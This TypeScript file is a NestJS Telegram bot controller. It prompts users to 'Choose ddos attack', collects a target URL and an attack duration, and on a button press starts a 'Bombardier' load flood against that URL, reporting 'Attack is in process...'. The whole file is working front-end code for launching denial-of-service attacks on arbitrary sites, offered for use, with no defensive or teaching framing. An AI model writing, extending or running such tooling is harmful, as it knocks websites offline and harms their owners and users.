import { Update, Start, Hears, On, Message, Ctx, Action } from 'nestjs-telegraf';
import { MainContext } from '../interfaces/context.interface';
import { DependenciesService } from './services/dependencies.service';
import { BombardierService } from './services/bombardier.service';
import { mainButtons } from './buttons/chooseDdos.button';
import { TelegramUtilService } from './services/telegram.util.service';
import { startDdos } from './buttons/startDdos.button';

@Update()
export class TelegramUpdate {

    constructor(
        private dependenciesService: DependenciesService,
        private bombardierService: BombardierService,
        private telegramUtilService: TelegramUtilService
    ) { }

    @Start()
    async start(ctx: MainContext) {

        ctx.reply('Hello! Choose ddos attack', mainButtons());

    }

    @Hears('Bombardier')
    async bombardier(ctx: MainContext) {
        this.clearSession(ctx);
        const id = ctx.from.id;
        await ctx.reply("I'm checking all the dependencies and downloading missing it. Wait please");
        this.dependenciesService.checkAllDependencies(id, ctx);
    }

    @Action(/ddos:bombardier/) 
    async startBomdardier(ctx: MainContext) {

        const { url, time } = ctx.session;
        const idUser = ctx.callbackQuery.from.id;
        this.bombardierService.start(url, time, idUser);
        ctx.editMessageText('Attack is in process...');
        this.clearSession(ctx);
    }


    @On('text')
    async getMessage(
        @Message('text') message: string,
        @Ctx() ctx: MainContext
    ) {
        if (!ctx.session.action) {
            ctx.reply("I don't know how to react to it!");
            return;
        }

        try {

            switch (ctx.session.action) {
                case 'url': {
                    const isUrl = this.telegramUtilService.checkUrl(message);

                    if(!isUrl) {
                        ctx.reply(`You provided an incorrect url! Try again`);
                        break;
                    }
                    ctx.session.url = message;
                    ctx.reply('Good! Provide time for attack (Mark in seconds)')
                    ctx.session.action = 'time';
                    break;
                }
                case 'time': {
                    const timeNumber = this.telegramUtilService.checkTime(message);
                    if(!timeNumber) {
                        ctx.reply(`You provided an incorrect number! Try again`);
                        break;
                    }
                    ctx.session.time = timeNumber;
                    ctx.reply('All the information was provided. Click button for start attacking', startDdos(ctx.session.typeDdos));
                    break;
                }
                default: {
                    ctx.reply(`I don't this action (${ctx.session.action})!`);
                    return;
                }
            }

        } catch (e) {
            ctx.reply('An error occurred, please try again');
        }
    }

    clearSession(ctx: MainContext) {
        ctx.session.typeDdos = undefined;
        ctx.session.url = undefined;
        ctx.session.time = undefined;
        ctx.session.action = undefined;
    }
}